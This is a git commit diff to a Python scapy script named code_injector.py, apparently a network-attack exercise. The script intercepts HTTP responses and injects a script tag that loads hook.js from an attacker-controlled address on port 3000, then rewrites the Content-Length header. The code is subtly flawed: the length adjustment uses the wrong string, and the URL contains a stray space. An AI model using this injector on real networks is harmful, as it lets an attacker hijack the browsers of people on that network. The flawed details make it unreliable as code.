c05c1a4999772324a5f9fcb3611a5a1844932d6b
root <root@localhost.localdomain>
2020-01-19 00:02:40 -0500

    Added code injector #1

--- code_injector.py
+++ code_injector.py
@@ -35,9 +35,19 @@ def process_packet(packet):
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print('[+] Response')
-            print(scapy_packet.show())
-            load = load.replace(
-                '</body>', '<script>alert("test");</script></body>')
+            # print(scapy_packet.show())
+
+            injection_code = "<script>alert('test');</script>"
+            injection_hook_code = '<script src="http://10.0.2.15: 3000/hook.js"></script>'
+
+            load = load.replace('</body>', injection_hook_code + '</body>')
+            content_length_search = re.search(
+                "(?:Content-Length:\s)(\d*)", load)
+
+            if content_length_search and 'text/html' in load:
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
 
         if load != scapy_packet[scapy.Raw].load:
             new_packet = set_load(scapy_packet, load)
